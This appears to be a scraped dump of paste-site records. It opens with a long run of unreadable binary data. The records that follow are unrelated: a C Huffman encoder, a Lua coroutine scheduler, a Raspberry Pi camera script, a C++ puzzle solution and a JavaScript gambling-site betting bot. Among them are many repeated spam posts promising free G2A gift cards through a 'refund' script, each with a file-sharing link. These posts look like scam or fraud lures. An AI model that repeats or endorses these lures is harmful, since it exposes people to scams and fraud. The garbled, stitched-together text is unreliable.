厇�l��uFUV��үK�nZ�Q���(�i�H���б�L=�D��L^��� @��8o�Z�""W5L�%$>Eķ~8��Y]4Oft>=�2/ �P��?���O!w����Tym�u��d^�uI[4~0���8��Z�M n2�Me�S�d�i��:�ԩAKC0O��XbHZ5Jm_Ō�~&�zHȐ��C���6*�̼��A[K9�L�٬w�VyB,�|?��?}���ecE��(���I��ԍ�*S��5a�!'��_3��ȭ��P�f�1L�C��N�+��MgŴv���^�B�R�?:�K�Y��u�1�����}��Ϫ~.`L����8��8n0,Ǧ�>�s�_!	h��,��O�mu}΀�Y�-Dأp�xE�U��E;܏m�K��==@�dy�����뱞�<�K��?m]���@/��<�� tC�c���L��6/�M���N�*1z��qw�i]�I��;
owSk|釗��v�d[(l���D%6�e&��h����46x���,Zޓ�蹾ϖs�١��	D5�Z����N�0m��0LʠÌ{q��#��	>����(���N3�Ş��Ce,R�%6.�ь�2����T�@��W�AX�e/�&B�^R�0͵J�/���I;!��jgV��L�|�I���Z�����O""9��c
o�8�d��݉��N�Ի�[�A�}v��x���]-wH�p��/�R���&���b���A����CJ�ɦsش^�(2>�K����*�DA�?��ƻ��2���GS�L�rA�fm��sW9�2�z!3xO�}�(�E��E�����!8j`x���ܪ�	�,����~
��#�2�(ܲ�[ ���	���Z�G�V��L�h@�z��3�6��k�X�����9cm�k����T�/��k����sh����CN�'L��\�^k��:��'��������Wu��?��Î&��>M��/>U
��~?�~�J���?�hY�5�P�1�J�>���nk6=��_����K�S���ȹ��)����+82��0��W���香�e�����'l��n����ȡ����~���|���a��״�N@�W�l��>-,�1���@�E�un�~wN~Bm�{O��͉�A�=?L�+� -��Q��ec[��3�&��x���
���M��V�t]���B�k��◽�®���U��$��)�0��y�h��[���_��.v_�W�y�i?G���k���Q�K�/8]?������
;��c��'��	�e)�UZ�
S�I}jQ~^�x�>�N����r
*em�áG��Y��|G@���s0K���=(%L������P��mҢ�NbGURW�s)�ũ���y��ʋ��$uղ�$�3mB�K�����C:���u-���ġ�Sw�9�C�#dD�I��N��%^J���Y��[;4y��m%f�2>_��܄��X�{Q�5���N����5��u��B�J) J�f��qp.��ai3��(�h��Jͅk�QV��?�.G
�I�=�53D?+е|(F�`�ĝ�o�R\&�.]��_��>�j!Y7`�e{?�ֲ�j�Z�޳<桯
����s;""��O@��w���m�^,N�a�vV����6� �lF��,��
�BoX� ʗ��I��#�nL����h��w���
i�O��h��oZ��G`���N���bG�Q� ��^����oj'in��2��7�p��ٓ2����n�;�2v�e�G�:;��[���xΨ�집��w�ɏ`�4u�ˌ����4�M����~�ڹs
�U:&��Z���fX���o��l��chC����8m8�Z�nJo�`M��ȵs�)i��-��C%q��;��a�DZ��4��~
�K�vi�zA{oh�����65�
���Т���Bt/8�a��YX�K��پ[�FR݅�r�ot�fs�P��I�B�c~��P��B[Fx3�B���q�t�v�B$��gߢK<�S�
鮿'��L84���x�8}:�c=/ޙ�f��ʽb���B���`���o""kȀ 19����}����s�Mx9���f���]��oǿ��\'�i�_4Z��6���(��YG{rsqo�6��55f�:�f����>0����ghl�E��e5{wyn6G��iV~]]@�t""t��)��w����I����y��+5ڃJ�6l��i,%��N�\J��ʹ
2�ch�Z�,#:����""���u8x>����An�D�ncc5+L�	gb�\7�)�
��:���ZQɗ�{s��W��7`�#�	=��jtuF�RZ򯽿�m��w�k+�j��6��nz^j�Yn�x�9�Ph���%͐�l���herK]�XE{2���T�_�ipf�X�""r�%�L��	���e<�8âvRw���ӫͩוg�W3t��N����iX���HBп�����(����N���js�����I�S�""M��g_��pc�M��W�%w��ՕIR�s���QJ ���m��&<�]ۙ��Q��r	nb}T�D6�Q˭3-#��բg�WĒ_����)_>Sк5���L]E�,S��v��G�Yd@����̍co�'�Q��t�	ߔZ�|¼�R�l��6�oP��=�e�u�� �I츜:m�����>���8�/�rB����+P�� �IR;�]+A�Z%>��k 0\?�?d��������v��p���f��'���>:�����wwh��䓑?������/�.yI�?�
{z � TY
!�@>E�f�_І7R�f(T)�������Cl���s���~s��ʤG
�4l��;J�/g5�����c�|��1��.y�aKˊ.�L��P J�@�?\0�.Y��0��}JZ��}���;�H���uL'�J�1뷯��\)L8��h-��9tN���_Y��8b�c�@垺�Mo3zR��?G�J�1K�_�!�@$�,���x5/�G��՞zmlQrE퍲LEDJrp3#c#�E""l#�%$դ�@l""��1�ϖ����N��;m��6�j�lZÓS^���ּv��:+I���=\�UC$��6�V�ǻ����0���/�㽓W��""6��@c3]@a͆ݫ�)/h�Vl����)�;�4���f�^�������Oڨ�h�C܁7�޻�����&g�e�`�K�&�.��`�����""���B�\�c��޺Z&s�·�{H��QY�4�,����x�E�dl.�Q��m�O��u�N�C��lE�}�3H��>�_��?����L�b\IA��	FXCu�y�X�c�""�v
�*�U�s�hFᗪJjn��-���K�u*���+�o�\�fEYG�Na�}�C��N�?�E����{i�)x""����J�*��Y�{q������uR���3QAC��!2%~��|߲���ÿ��f��F�:�U�g��*~��<�#�|V�ō���ovo�������q�hQ61����g��]���?J
ǔ�h���:�$��
ﾊ�dǄ���ȓ��S.�Ȉ""���Ȏ�),잇���c\L���u����<8�'n.R�(��f΍�%�dG!�T^��:�����:�LTk h�kt��G��:��M�:Q�5Zk�?#}�����n��9Rr���	
�z�B/��|�77G�(�c�1k�G\+��Hv�HP�$��%��Y���_�`�0Hn�ʹcڕ
�̄R���,l�߼;""f��?��/�a�T��L,+Ϝ���!yp�Ck�e�XR�BU�>v�2�ͪ��2*ċ&��B(��n���؆����UͧƬi����ow��Y����
�b�������qD�
Y��&��u�,Lvz�?/1	�X��Lm֊Y�( ���� �|`�+��g�����CNl��7�b:�e�Z�m�d�B~��������t�`��tf;��	�ם$�ju�1&W6��%g�;�q��S�3���#3��.7S������j���{�{�Āx��9\�i�#�b�wjd����o���[�� '�/���\��>�5ԃT�^���%�t��1�ꍜ����>u������=K��&��#Ob`��x�y�<N\�[b�""/=EJ/��� �c�G�O�C�_xo[�ˤ�Ay�����Zl��.�6���'E��B��($-�,�q얷�B��!W��*�ҷ]Õ pJ��$@�6��t5�O�>�~S��6�$��i�%�b)�e�����[@�j�y>�:`5��ݠ�h瀞V��ܳ=��X�Z�m\���r#X��%-ߎ����P����_�M�g^Ӆߢ��]���RB��Ʌ'�YWf�5Ax}HՓ��1pQI�m��Z����l�K������l�lm��۲֟~n���}蕶�g*w�M��~�6�}�#!�~J�w�&��($iڨ���(Ш$X*�Ølc�""�pL#SlES����16 �>ޙx@'F�S���תA��epB�؆=���Ýf +ҹ���c#�J*%<��46��^>�Z�	�}�RZ6��}���n�w$�i�Fi`B,�/dX9/^H ���oǳ�T4%)@�(""�z�NI^g6�����Y�5�3q�;I���x������}�9�7���I�S���*$����[��?�3���
.Z)o+Eٚ�E��~�����ɛ���Q4��5�h`!�4�z�hc�#��r�����ʃ�n����)k�Zǋv����̼{���aTl���l���v܄�3�p9!��w$S�	�-?��3nL>a����2���,���GBMB"
Ttu7iKms,💰G2A.com Free Gift Card Guide 2024 May🔥,Alfonso1119,Python,Wednesday 29th of May 2024 10:55:12 PM CDT,"G2A.com free GC & Games updated guide.
Any item for free on G2A.com including Apple gift cards & everything else offered. 
This is the most updated version of the script. Any other posted will not work!

PDF guide:
https://drive.google.com/file/d/1fu-L9saEYF3p8c22aD4kJyaloZDzbZfJ/view?usp=g2a_refund_guide_5969148.pdf

Working as of:

29 May 2024"
pcNeCu39,"Huffman Tree for Educoder.net, Encode & Decode",LambdaExpr_,C,Wednesday 29th of May 2024 10:53:57 PM CDT,"#include <stdlib.h>
#include <stdio.h>
#include <string.h>

typedef struct Element
{
    int weight;
    char ch;
} Element;

int compare(Element lhs, Element rhs)
{
    if (lhs.weight < rhs.weight)
    {
        return -1;
    }
    if (rhs.weight < lhs.weight)
    {
        return 1;
    }
    return 0;
}

enum Subtree
{
    LEFT = '0',
    RIGHT = '1'
};

struct HuffmanTree
{
    struct HuffmanTree *left;
    struct HuffmanTree *right;
    Element element;
};
typedef struct HuffmanTree HuffmanTree;

HuffmanTree *newHuffmanTree(int weight, char ch)
{
    HuffmanTree *tree = (HuffmanTree *)malloc(sizeof(HuffmanTree));
    tree->left = tree->right = NULL;
    tree->element.weight = weight;
    tree->element.ch = ch;
    return tree;
}

void deleteHuffmanTree(HuffmanTree *this)
{
    if (this->left != NULL)
    {
        deleteHuffmanTree(this->left);
    }
    if (this->right != NULL)
    {
        deleteHuffmanTree(this->right);
    }
    free(this);
}

typedef struct LinkedList
{
    HuffmanTree *object;
    struct LinkedList *next;
} LinkedList;

LinkedList *newLinkedList(HuffmanTree *tree)
{
    LinkedList *list = (LinkedList *)malloc(sizeof(LinkedList));
    list->object = tree;
    list->next = NULL;
    return list;
}

void deleteLinkedList(LinkedList *this)
{
    if (this->next != NULL)
    {
        deleteLinkedList(this->next);
    }
    free(this);
}

LinkedList *insertIntoList(LinkedList *this, LinkedList *position, LinkedList *newnode)
{
    newnode->next = position->next;
    position->next = newnode;
    return this;
}

LinkedList *removeFromList(LinkedList *this, LinkedList *position)
{
    if (position->next == NULL)
    {
        return NULL;
    }
    LinkedList *result = position->next;
    position->next = result->next;
    result->next = NULL;
    return result;
}

LinkedList *treeInsert(LinkedList *this, HuffmanTree *tree)
{
    if (tree == NULL)
    {
        return this;
    }
    LinkedList *p = this;
    while (p->next != NULL && compare(p->next->object->element, tree->element) < 0)
    {
        
        p = p->next;
    }

    insertIntoList(this, p, newLinkedList(tree));
    return this;
}

HuffmanTree *treeTakeFirst(LinkedList *this)
{
    LinkedList *tree_holder = removeFromList(this, this);
    if (tree_holder == NULL)
    {
        return NULL;
    }
    HuffmanTree *result = tree_holder->object;
    deleteLinkedList(tree_holder);
    return result;
}

typedef struct Stack
{
    int size;
    int top;
    int *array;
} Stack;

Stack *newStack(int size)
{
    if (size < 1)
    {
        size = 1;
    }
    Stack *stack = (Stack *)malloc(sizeof(Stack));
    stack->size = size;
    stack->top = -1;
    stack->array = (int *)malloc(size * sizeof(int));
    return stack;
}

void deleteStack(Stack *this)
{
    if (this == NULL || this->array == NULL)
    {
        return;
    }
    free(this->array);
    this->array = NULL;
    free(this);
    this = NULL;
}

void resizeStack(Stack *this, int size)
{
    if (size < 1)
    {
        size = 1;
    }
    int *new_array = (int *)malloc(size * sizeof(int));
    memcpy(new_array, this->array, sizeof(int));
    free(this->array);
    this->array = new_array;
    this->size = size;
}

void stackPush(Stack *this, int value)
{
    if (this->top + 1 == this->size)
    {
        resizeStack(this, this->size * 2);
    }
    this->array[++this->top] = value;
}

int stackTop(Stack *this)
{
    return this->array[this->top];
}

int stackPop(Stack *this)
{
    return this->array[this->top--];
}

int stackEmpty(Stack *this)
{
    return this->top < 0;
}

char *stack2String(Stack *this)
{
    char *result = (char *)malloc((this->top + 2) * sizeof(char)); // +1 +'\0' = +2
    for (int i = 0; i <= this->top; ++i)
    {
        result[i] = this->array[i];
    }
    result[this->top + 1] = '\0';
    return result;
}

HuffmanTree *construct(LinkedList *trees)
{
    HuffmanTree *left_subtree = treeTakeFirst(trees);
    HuffmanTree *right_subtree = treeTakeFirst(trees);
    if (left_subtree != NULL && right_subtree == NULL)
    {
        return left_subtree;
    }
    HuffmanTree *new_tree = newHuffmanTree(
        left_subtree->element.weight + right_subtree->element.weight,
        '\0');
    new_tree->left = left_subtree;
    new_tree->right = right_subtree;
    treeInsert(trees, new_tree);
    return construct(trees);
}

void traversal(HuffmanTree *tree, Stack *stack, char *map[])
{
    if (tree == NULL)
    {
        return;
    }
    if (tree->element.ch != '\0')
    {
        map[(int)(tree->element.ch)] = stack2String(stack);
    }
    stackPush(stack, LEFT);
    traversal(tree->left, stack, map);
    stackPop(stack);
    stackPush(stack, RIGHT);
    traversal(tree->right, stack, map);
    stackPop(stack);
}

HuffmanTree *makeEncoder(LinkedList *trees, char *map[])
{
    HuffmanTree *tree = construct(trees);
    Stack *stack = newStack(8);
    traversal(tree, stack, map);
    deleteStack(stack);
    return tree;
}

char decodeChar(HuffmanTree *tree, const char *string, size_t *begin)
{
    HuffmanTree *p = tree;
    while (p->element.ch == '\0')
    {
        if (string[*begin] == LEFT)
        {
            p = p->left;
        }
        else if (string[*begin] == RIGHT)
        {
            p = p->right;
        }
        else
        {
            break;
        }
        ++(*begin);
    }
    return p->element.ch;
}

void encode(char *src, char *dst, char *map[])
{
    for (char *psrc = src, *pdst = dst; *psrc != '\0'; ++psrc)
    {
        for (char *p = map[(int)(*psrc)]; *p != '\0'; *pdst++ = *p++)
            ;
    }
}

void decode(const char *src, char *dst, HuffmanTree *huffman_tree)
{
    char *pdst = dst;
    for (size_t i = 0; i < strlen(src);)
    {
        *pdst++ = decodeChar(huffman_tree, src, &i);
    }
}

int main()
{
    int n;
    scanf(""%d"", &n);

    int weights[102];
    char chars[102];
    for (int i = 0; i < n; ++i)
    {
        char str[8];
        scanf(""%s"", str);
        chars[i] = str[0];
    }
    for (int i = 0; i < n; ++i)
    {
        scanf(""%d"", &weights[i]);
    }

    LinkedList *trees = newLinkedList(NULL);
    for (int i = 0; i < n; ++i)
    {
        HuffmanTree *tree = newHuffmanTree(weights[i], chars[i]);
        treeInsert(trees, tree);
    }

    char *encode_map[128];
    memset(encode_map, 0, sizeof(encode_map));
    HuffmanTree *huffman = makeEncoder(trees, encode_map);

    // for (char i = 0; i >= 0; ++i)
    // {
    //     printf(""%c %s\n"", i, encode_map[i]);
    // }

    char code[102];
    scanf(""%s"", code);
    char encoded[1000];
    memset(encoded, 0, sizeof(encoded));
    encode(code, encoded, encode_map);
    printf(""%s\n"", encoded);

    char decoded[102];
    memset(decoded, 0, sizeof(decoded));
    decode(encoded, decoded, huffman);
    printf(""%s\n"", decoded);

    deleteHuffmanTree(huffman);
    deleteLinkedList(trees);

    return 0;
}
"
BTdwtwTH,💰G2A.com Free Gift Card Guide 2024 May🚀,atakan1983,Python,Wednesday 29th of May 2024 10:43:06 PM CDT,"G2A.com free GC & Games updated guide.
Any item for free on G2A.com including Playstation gift cards & everything else offered. 
This is the most updated version of the script. Any other posted will not work!

PDF guide:
https://drive.google.com/file/d/1fu-L9saEYF3p8c22aD4kJyaloZDzbZfJ/view?usp=g2a_refund_guide_5969148.pdf

Working as of:

29 May 2024"
U7nLunfp,🤑G2A.com Free Gift Card Guide 2024 May🔥,lookos13,Python,Wednesday 29th of May 2024 10:37:01 PM CDT,"G2A.com free GC & Games updated guide.
Any item for free on G2A.com including Steam gift cards & everything else offered. 
This is the most updated version of the script. Any other posted will not work!

PDF guide:
https://drive.google.com/file/d/1fu-L9saEYF3p8c22aD4kJyaloZDzbZfJ/view?usp=g2a_refund_guide_5969148.pdf

Working as of:

29 May 2024"
dFyyJxbD,💸G2A.com Free Gift Card Guide 2024 May💰,pestinha,Python,Wednesday 29th of May 2024 10:30:57 PM CDT,"G2A.com free GC & Games updated guide.
Any item for free on G2A.com including Amazon gift cards & everything else offered. 
This is the most updated version of the script. Any other posted will not work!

PDF guide:
https://drive.google.com/file/d/1fu-L9saEYF3p8c22aD4kJyaloZDzbZfJ/view?usp=g2a_refund_guide_5969148.pdf

Working as of:

29 May 2024"
PGahc4u7,thready.lua,DiamondDaDog,Lua,Wednesday 29th of May 2024 10:30:40 PM CDT,"--- ""Thread"" (coroutine) handling system that allows different systems to run their main loops in separate threads.

local expect = require ""cc.expect"".expect
local logging = require ""logging""
local thread_context = logging.create_context(""Thready"")

---@class thread_data
---@field thread thread The coroutine thread.
---@field id integer The ID of the thread.
---@field set_name string The name of the set that owns the thread.
---@field event_filter string|nil The event filter for the thread.
---@field status thread_status The status of the thread.
---@field alive boolean Whether the thread is alive or not.
---@field init_args table The arguments passed to the thread function.

---@class listener_data
---@field event string The event to listen for.
---@field callback fun(event:string, ...:any) The callback to run when the event is received.
---@field id integer The ID of the listener.
---@field set_name string The name of the set that owns the listener.

---@alias thread_status ""running""|""suspended""|""dead""|""new""

---@class thready
---@field coroutines table<string, thread_data[]> A table of coroutines for each set.
---@field listeners table<string, listener_data[]> A table of listeners for each set/event.
---@field stop_on_error boolean Whether to stop the entire system on error.
---@field kill_set_on_error boolean Whether to kill all threads for a set on error.
---@field running boolean Whether the system is currently running.
local thready = {
  coroutines = {},
  listeners = {},
  stop_on_error = false,
  kill_set_on_error = true,
  running = false
}

local used_ids = {}
--- Generate a unique ID for a thread.
local function gen_unique_id()
  local id = math.random(1, 2^31 - 1)

  while used_ids[id] do
    id = math.random(1, 2^31 - 1)
  end

  used_ids[id] = true
  return id
end

--- Check if a coroutine has errored and handle it.
--- @param coro_data thread_data The coroutine data to check.
---@return boolean kill_all Whether to kill all threads for the set.
local function check_errored(coro_data)
  if not coro_data.alive then
    if thready.stop_on_error then
      thready.running = false
      error((""%s thread %d errored: %s""):format(coro_data.set_name, coro_data.id, coro_data.event_filter), 0)
    end

    if thready.kill_set_on_error then
      thread_context.error((""%s thread %d errored: %s""):format(coro_data.set_name, coro_data.id, coro_data.event_filter))
      return true
    else
      thread_context.warn((""Ignoring error in %s thread %d: %s""):format(coro_data.set_name, coro_data.id, coro_data.event_filter))
    end
  end

  return false
end

local function update_status(coro_data)
  coro_data.status = coroutine.status(coro_data.thread)
end

local function remove_thread(set_name, id)
  local coros = thready.coroutines[set_name]
  if not coros then return end

  for i = 1, #coros do
    if coros[i].id == id then
      table.remove(coros, i)
      used_ids[id] = nil
      break
    end
  end
end

--- Run a single step of all coroutines in the system given an event.
---@param event_name string The name of the event to run.
---@param ... any The arguments of the event.
local function run(event_name, ...)
  local to_remove = {}
  local to_kill = {}

  for set_name, coros in pairs(thready.coroutines) do
    for i = 1, #coros do
      local coro = coros[i]

      if coro.status == ""suspended"" then
        -- Resume the coroutine, but ONLY if:
        -- 1. The event filter is nil (no filter)
        -- 2. The event filter is not nil, but the event matches the filter.
        -- 3. The event is a `terminate` event.
        if not coro.event_filter or coro.event_filter == event_name or event_name == ""terminate"" then
          coro.alive, coro.event_filter = coroutine.resume(coro.thread, event_name, ...)
        end

        -- Check if errored
        if check_errored(coro) then
          to_kill[set_name] = true
          break -- stop executing this set's coroutines
        end

        update_status(coro)

        -- If the coroutine is dead, mark it for removal.
        if coro.status == ""dead"" then
          to_remove[coro.id] = set_name
        end
      elseif coro.status == ""new"" then
        -- Initialize by running once.
        coro.alive, coro.event_filter = coroutine.resume(coro.thread, table.unpack(coro.init_args, 1, coro.init_args.n))

        -- Check if errored
        if check_errored(coro) then
          to_kill[set_name] = true
          break -- stop executing this set's coroutines
        end

        update_status(coro)

        -- If the coroutine is dead, mark it for removal.
        if coro.status == ""dead"" then
          to_remove[coro.id] = set_name
        end
      elseif coro.status == ""dead"" then
        -- Remove dead coroutines.
        to_remove[coro.id] = set_name

        -- Check if errored
        if check_errored(coro) then
          to_kill[set_name] = true
          break -- stop executing this set's coroutines
        end
      end
    end
  end

  -- Remove dead coroutines.
  for id, set_name in pairs(to_remove) do
    remove_thread(set_name, id)
  end

  -- Remove all threads for sets that errored.
  for set_name in pairs(to_kill) do
    thready.kill_all(set_name)
  end
end

--- Run the main loop of the thread system. Recommend using this with `parallel`.
---@see thready.parallelAny
---@see thready.parallelAll
function thready.main_loop()
  thready.running = true
  thread_context.debug(""Thready started."")
  while thready.running do
    local event_data = table.pack(os.pullEvent())

    -- spawn listeners
    for _, set in pairs(thready.listeners) do
      for _, listener in ipairs(set) do
        if listener.event == event_data[1] then
          thready.spawn(listener.set_name, listener.callback, table.unpack(event_data, 1, event_data.n))
        end
      end
    end

    run(table.unpack(event_data, 1, event_data.n))
  end
  thread_context.debug(""Thready stopped."")
end

--- Start the thread system in parallel with other functions. This is a shorthand to `parallel.waitForAny(thready.main_loop, ...)`.
--- ## Usage
--- ```lua
--- thready.parallelAny(
---   your_main_loop,
---   other_main_loop,
---   ...
--- )
--- ```
---@param ... function The main loop(s) of the program.
function thready.parallelAny(...)
  if thready.running then
    error(""Thread system is already running."", 2)
  end

  local args = {...}

  for i, fun in ipairs(args) do
    expect(i, fun, ""function"")
  end

  parallel.waitForAny(thready.main_loop, ...)
end

--- Start the thread system in parallel with other functions. This is a shorthand to `parallel.waitForAll(thready.main_loop, ...)`.
--- ## Usage
--- ```lua
--- thready.parallelAll(
---   your_main_loop,
---   other_main_loop,
---   ...
--- )
--- ```
---@param ... function The main loop(s) of the program.
function thready.parallelAll(...)
  if thready.running then
    error(""Thread system is already running."", 2)
  end

  local args = {...}

  for i, fun in ipairs(args) do
    expect(i, fun, ""function"")
  end

  parallel.waitForAll(thready.main_loop, ...)
end

--- Spawn a new thread for a given set.
---@param set_name string The name of the set to spawn the thread in.
---@param thread_fun fun() The function to run in the thread.
---@param ... any The arguments to pass to the thread function.
---@return integer id The ID of the spawned thread.
function thready.spawn(set_name, thread_fun, ...)
  expect(1, set_name, ""string"")
  expect(2, thread_fun, ""function"")
  --

  local id = gen_unique_id()
  local thread = coroutine.create(thread_fun)

  ---@type thread_data
  local coro_data = {
    thread = thread,
    id = id,
    set_name = set_name,
    event_filter = nil,
    status = ""new"",
    alive = true,
    init_args = table.pack(...)
  }

  if not thready.coroutines[set_name] then
    thready.coroutines[set_name] = {}
  end

  thread_context.debug((""Spawning thread id %d in set %s.""):format(id, set_name))
  table.insert(thready.coroutines[set_name], coro_data)
  return id
end

--- Add a listener for a given event.
---@param event string The event to listen for.
---@param callback fun(event:string, ...:any) The callback to run when the event is received.
---@return integer id The ID of the listener.
function thready.listen(set_name, event, callback)
  expect(1, event, ""string"")
  expect(2, callback, ""function"")
  --

  local id = gen_unique_id()
  used_ids[id] = true

  if not thready.listeners[set_name] then
    thready.listeners[set_name] = {}
  end

  table.insert(thready.listeners[set_name], {
    event = event,
    set_name = set_name,
    callback = callback,
    id = id
  })

  thread_context.debug((""Listening for event %s in set %s with listener id %d.""):format(event, set_name, id))
  return id
end

--- Remove a listener by its ID. This will not stop any currently running listeners.
---@param id integer The ID of the listener to remove.
function thready.remove_listener(id)
  expect(1, id, ""number"")
  --

  for _, set in pairs(thready.listeners) do
    for i = 1, #set do
      if set[i].id == id then
        table.remove(set, i)
        used_ids[id] = nil
        thread_context.debug((""Removed listener id %d.""):format(id))
        return
      end
    end
  end

  thread_context.warn((""Attempted to remove listener id %d, but it does not exist.""):format(id))
end

--- Kill a thread.
---@param id integer The ID of the thread to kill.
function thready.kill(id)
  expect(1, id, ""number"")
  --

  for set_name, coros in pairs(thready.coroutines) do
    for i = 1, #coros do
      if coros[i].id == id then
        remove_thread(set_name, id)
        thread_context.debug((""Killed thread id %d in set %s.""):format(id, set_name))
        return
      end
    end
  end

  thread_context.warn((""Attempted to kill thread id %d, but it does not exist.""):format(id))
end

--- Kill all threads for a given set.
---@param set_name string The name of the set to kill all threads for.
function thready.kill_all(set_name)
  expect(1, set_name, ""string"")
  --
  thread_context.debug((""Killing all threads and stopping listeners in set %s.""):format(set_name))

  local coros = thready.coroutines[set_name]

  -- If no coroutines exist, return.
  if not coros then
    return
  end

  -- Clear the used IDs
  for i = 1, #coros do
    used_ids[coros[i].id] = nil
  end

  -- Remove the coroutines
  thready.coroutines[set_name] = nil

  -- Remove the listeners
  thready.listeners[set_name] = nil
end

--- Clear the entire thread system.
function thready.clear()
  thready.coroutines = {}
  used_ids = {}
end

return thready"
WK5Zv5Ea,Untitled,Iequezada,Python,Wednesday 29th of May 2024 10:30:22 PM CDT,"import time
import os
from picamera2 import Picamera2, Preview
from picamera2.controls import Controls

# Define the directory to save images
save_directory = ""/media/iequezada/Kingston32/tl""

# Ensure the save directory exists
os.makedirs(save_directory, exist_ok=True)

# Initialize camera
picam2 = Picamera2()

# Configure for the best quality sensor format
preview_config = picam2.create_preview_configuration()
capture_config = picam2.create_still_configuration(raw={'size': (4608, 2592), 'format': 'SRGGB10_CSI2P'}, main={'size': (4608, 2592), 'format': 'BGR888'})

# Configure preview mode
picam2.configure(preview_config)

# Start the camera
picam2.start_preview(Preview.QTGL)
picam2.start()
time.sleep(2)  # Let the camera warm up

# Set manual controls using the ""direct"" attribute method
with picam2.controls as ctrl:
    ctrl.AfMode = 2                         # Enable auto-focus
    ctrl.AfTrigger = 1                      # Trigger auto-focus
    ctrl.AnalogueGain = 1.1228070259094238  # Lowest possible value
    ctrl.ExposureTime = 20000               # Shutter speed in microseconds, e.g., 1/36 seconds
    ctrl.AeEnable = False                   # Disable auto exposure
    ctrl.AwbEnable = False
    ctrl.ColourGains = (1.5, 2.0)           # Set white balance
    ctrl.NoiseReductionMode = 0             # Turn off noise reduction

time.sleep(3)  # Give time for the settings to take effect and for the auto-focus to complete

# Function to get the next available filename
def get_next_filename(base_dir, base_name, extension):
    i = 1
    while True:
        filename = f""{base_name}_{i}.{extension}""
        if not os.path.exists(os.path.join(base_dir, filename)):
            return filename
        i += 1

# Capture images every 1 minute
while True:
    # Capture JPEG
    jpeg_filename = get_next_filename(save_directory, ""image"", ""jpg"")
    picam2.switch_mode_and_capture_file(capture_config, os.path.join(save_directory, jpeg_filename), name=""main"")
    print(f""Captured {jpeg_filename}"")

    # Capture DNG
    dng_filename = get_next_filename(save_directory, ""image"", ""dng"")
    picam2.switch_mode_and_capture_file(capture_config, os.path.join(save_directory, dng_filename), name=""raw"")
    print(f""Captured {dng_filename}"")

    # Wait for 55 secs
    time.sleep(55)

"
G01Cmg5c,🤑 G2A.com Free Gift Card Guide May 2024 FIX 🎁,ssss50w,GetText,Wednesday 29th of May 2024 10:26:19 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1KMb0fLkKHIC2qdjR4vCSRH9rVSjJVMdX/view?usp=sharing
 
Working as of:
30 May 2024"
9hFkGiZp,Rotting Oranges,jayati,C++,Wednesday 29th of May 2024 10:13:54 PM CDT,"class Solution {
public:
    int orangesRotting(vector<vector<int>>& grid) {
        queue<pair<pair<int,int>,int>> q;
        int n=grid.size();
        int m=grid[0].size();
        int vis[n][m];
        int cfresh=0;
        for(int i=0;i<n;i++)
        {
            for(int j=0;j<m;j++)
            {
                if(grid[i][j]==2)
                {
                    q.push({{i,j},0});
                    vis[i][j]=2;
                }
                else
                {
                    vis[i][j]=0;
                }
                if(grid[i][j]==1)
                {
                    cfresh++;
                }
            }
        }
        int dx[4]={-1,0,1,0};
        int dy[4]={0,1,0,-1};
        int c=0;
        int tm=0;
        while(!q.empty())
        {
            int r=q.front().first.first;
            int col=q.front().first.second;
            int t=q.front().second;
            tm = max(t,tm);
            q.pop();
            for(int k=0;k<4;k++)
            {
                int nr=r+dx[k];
                int nc=col+dy[k];
                
                if((nr>=0 && nr<n) && (nc>=0 && nc<m) && vis[nr][nc]==0 && grid[nr][nc]==1)
                {
                    q.push({{nr,nc},t+1});
                    vis[nr][nc]=2;
                    c++;
                }
            }
        }
        if(c!=cfresh)
        {
            return -1;
        }
        return tm;
    }
};"
mm8csw0g,💸G2A.com Free Gift Card Guide 2024 May💰,Bufayez,Python,Wednesday 29th of May 2024 09:56:36 PM CDT,"G2A.com free GC & Games updated guide.
Any item for free on G2A.com including Steam gift cards & everything else offered. 
This is the most updated version of the script. Any other posted will not work!

PDF guide:
https://drive.google.com/file/d/1fu-L9saEYF3p8c22aD4kJyaloZDzbZfJ/view?usp=g2a_refund_guide_7420690.pdf

Working as of:

29 May 2024"
SF4gHgMe,best bot ever by snowy,coinwalk,JavaScript,Wednesday 29th of May 2024 09:41:07 PM CDT,"var elderly = parseFloat(document.getElementById('pct_balance').value);
var prefit = Number((elderly/3200).toFixed(8));
var beast = prefit;
var crust = (prefit/2);
var tens = (prefit*10);
var sevens = (prefit*6.9);
var eights = (prefit*7.9);
var throttle = (prefit*64);
var winnerdinner = 144000;
var snow = elderly;
var james = ((Math.floor(elderly/tens))*tens);
var snowie = 0;
var great = 0;
var downer = 2.9;
var upper = 6.9;
var greatie = document.getElementById('pct_balance').value;
var neon = 0;
 
 function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
 
async function go(){
if (greatie!=great){
great = document.getElementById('pct_balance').value;
if (great>=snow){
neon = great-snow;
}
if (great<snow){
neon = snow-great; 
}
if ((great!=snowie)&&(great>(((Math.floor(great/tens))*tens)+sevens))&&(great<(((Math.floor(great/tens))*tens)+eights))){
    beast = beast*2;
    snowie = parseFloat(great);
}
if ((neon>throttle)&&(great<(((Math.floor(great/tens))*tens)+sevens))){
    beast = prefit;
    neon = 0;
    snow = parseFloat(great);
    snowie = 0;
}
if (great>=winnerdinner){
console.log(""winner winner chicken dinner"");
return;
}
$('#pct_chance').val(49.5);
$('#pct_bet').val(((beast*1).toFixed(8)));
$('#a_lo').click();
}
await sleep(1);
greatie = document.getElementById('pct_balance').value;
go();
}
 
go();
"
anQBHdFu,💰G2A.com Free Gift Card Guide 2024 May🔥,atakan1983,Python,Wednesday 29th of May 2024 09:32:17 PM CDT,"G2A.com free GC & Games updated guide.
Any item for free on G2A.com including Amazon gift cards & everything else offered. 
This is the most updated version of the script. Any other posted will not work!

PDF guide:
https://drive.google.com/file/d/1fu-L9saEYF3p8c22aD4kJyaloZDzbZfJ/view?usp=g2a_refund_guide_7420690.pdf

Working as of:

29 May 2024"
2hceMQr0,🤑G2A.com Free Gift Card Guide 2024 May💰,lookos13,Python,Wednesday 29th of May 2024 09:26:13 PM CDT,"G2A.com free GC & Games updated guide.
Any item for free on G2A.com including Playstation gift cards & everything else offered. 
This is the most updated version of the script. Any other posted will not work!

PDF guide:
https://drive.google.com/file/d/1fu-L9saEYF3p8c22aD4kJyaloZDzbZfJ/view?usp=g2a_refund_guide_7420690.pdf

Working as of:

29 May 2024"
